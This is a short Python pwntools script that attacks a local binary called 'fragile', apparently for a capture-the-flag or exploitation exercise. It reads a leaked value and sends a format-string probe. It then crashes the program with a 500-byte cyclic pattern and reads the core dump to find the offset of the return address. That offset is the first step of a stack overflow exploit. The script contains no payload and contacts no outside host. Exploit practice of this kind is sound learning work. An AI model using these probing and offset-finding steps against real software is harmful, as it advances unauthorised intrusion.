from pwn import *


io = process("./fragile")


io.recvline()
leak = io.recvline(keepends=False).decode()[9:]
io.sendline("b%p,%p,%p")
io.recvline()
print(io.recvline())
io.sendline(cyclic(500))
io.wait()
core = io.corefile
stack = core.rsp
info("rsp=%#x", stack)
pattern = core.read(stack, 4)
rip_offset = cyclic_find(pattern)
info("rip offset is %d", rip_offset)
